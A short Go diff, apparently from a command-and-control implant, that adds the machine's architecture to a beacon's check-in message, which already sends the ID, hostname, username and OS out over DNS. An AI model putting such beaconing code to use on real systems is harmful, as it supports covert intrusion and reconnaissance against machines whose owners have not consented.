@@ -82,8 +82,12 @@ func (b *Beacon) checkIn() (string, error) {
 	if len(shortOS) > 7 {
 		shortOS = shortOS[:7]
 	}
-	checkInData := fmt.Sprintf("CHK|%s|%s|%s|%s",
-		b.id, shortHostname, shortUsername, shortOS)
+	shortArch := b.arch
+	if len(shortArch) > 6 {
+		shortArch = shortArch[:6]
+	}
+	checkInData := fmt.Sprintf("CHK|%s|%s|%s|%s|%s",
+		b.id, shortHostname, shortUsername, shortOS, shortArch)
 
 	// Send check-in via DNS query
 	response, err := b.client.sendCommand(checkInData)
